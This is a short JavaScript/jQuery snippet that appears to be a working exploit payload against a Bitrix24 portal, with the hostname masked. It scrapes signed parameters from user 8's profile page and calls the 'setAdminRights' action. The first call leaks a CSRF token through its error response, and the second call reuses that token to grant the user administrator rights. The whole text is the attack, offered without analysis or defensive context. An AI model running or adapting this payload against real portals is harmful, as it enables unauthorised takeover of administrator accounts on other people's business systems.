var sp;
$.get( "https://xxxxxxx.bitrix24.com/company/personal/user/8/?IFRAME=Y&IFRAME_TYPE=SIDE_SLIDER", function( data ) {
  sp=data.split('signedParameters')[1].split("VALUE")[0].split('componentName')[0].replace(/\\|\\|:|}|\'|,/g,'').trim();
  $.post("https://xxxxxxx.bitrix24.com/bitrix/services/main/ajax.php?mode=ajax&c=bitrix%3Aintranet.user.profile&action=setAdminRights",
         {SITE_ID:'s1',sessid:'',signedParameters:sp},function(dd){
                                                       sessid=dd.errors[0]["customData"]["csrf"];
                                                       $.post("https://xxxxxxx.bitrix24.com/bitrix/services/main/ajax.php?mode=ajax&c=bitrix%3Aintranet.user.profile&action=setAdminRights",
                                                              {SITE_ID:'s1',sessid:sessid,signedParameters:sp},function(xd){});
})
});
 